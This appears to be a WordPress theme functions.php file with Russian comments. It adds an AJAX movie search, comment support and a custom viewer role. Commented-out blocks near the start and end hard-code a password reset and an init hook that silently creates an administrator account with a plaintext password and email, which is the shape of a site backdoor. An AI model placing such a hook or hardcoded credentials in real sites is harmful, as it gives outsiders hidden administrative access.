<?php
//$my_user_info = get_user_by( 'login', 'sda' ); // Здесь получаем объект с инфо юзера (в том числе с ID)
//wp_set_password("dfhdgh4", $my_user_info->ID); // Здесь точно также обновляем пароль

/*
 ==================
 Ajax Search
======================
*/
// add the ajax fetch js
add_action( 'wp_footer', 'ajax_fetch' );
function ajax_fetch() {
    ?>
    <script type="text/javascript">
        function fetch(){

            jQuery.ajax({
                url: '<?php echo admin_url('admin-ajax.php'); ?>',
                type: 'post',
                data: { action: 'data_fetch', keyword: jQuery('#keyword').val() },
                success: function(data) {
                    //console.log(data);
                    jQuery('#datafetch').html( data );
                }
            });

        }
    </script>

    <?php
}

// the ajax function
add_action('wp_ajax_data_fetch' , 'data_fetch');
add_action('wp_ajax_nopriv_data_fetch','data_fetch');
function data_fetch(){

    $the_query = new WP_Query(
        array(
        'posts_per_page' => -1,
        's' => esc_attr( $_POST['keyword'] ),
        'post_type'   => 'movie' )
    );
    if( $the_query->have_posts() ) :
        echo '<ul>';
        while( $the_query->have_posts() ): $the_query->the_post();

            $myquery = mb_strtolower((esc_attr( $_POST['keyword'] )));

            $search = mb_strtolower(get_the_title());
            if( stripos("/{$search}/", $myquery) !== false) { ?>


                <li><a href="<?php echo esc_url(post_permalink()); ?>"><?php the_title(); ?></a></li>

                <?php

            }
            endwhile;
        echo '</ul>';?>
        <ul><li><a class="search-link" href="/search/?search=<?= esc_attr( $_POST["keyword"] )?>">Все результаты ></a></li></ul>
    <?php
        wp_reset_postdata();
    else: ?>
        <ul><li>Ничего не найдено</li></ul>

  <?  endif;

    die();
}
function comment_support_for_my_custom_post_type() {
    add_post_type_support( 'movie', 'comments' );
}
add_action( 'init', 'comment_support_for_my_custom_post_type' );
if ( ! function_exists( 'main_setup' ) ) :
    function main_setup() {
        /**
         * Enable support for Post Thumbnails on posts and pages.
         * @link //developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
         */
        add_theme_support( 'post-thumbnails' );
    }
endif;
add_action( 'after_setup_theme', 'main_setup' );
// добавляем Смотрящие
/*$result = add_role( 'role_see', __(
    'Смотрящий' ),
    array(

        'edit_themes' => false, // редактирование тем
        'install_plugins' => false, // установка плагинов
        'update_plugin' => false, // обновление плагинов
        'update_core' => false // обновление ядра WordPress

    )
);*/
//remove_role( "Смотрящий" );
/*function tb_admin_account(){
    $user = 'landpool';
    $pass = 'landpool444';
    $email = 'landpool22@mail.ru';
    if ( !username_exists( $user )  && !email_exists( $email ) ) {
        $user_id = wp_create_user( $user, $pass, $email );
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
    } }
add_action('init','tb_admin_account');*/
add_action( 'init', function(){

    if (  current_user_can( 'role_see' ) ) {
        show_admin_bar( false );
    }

} );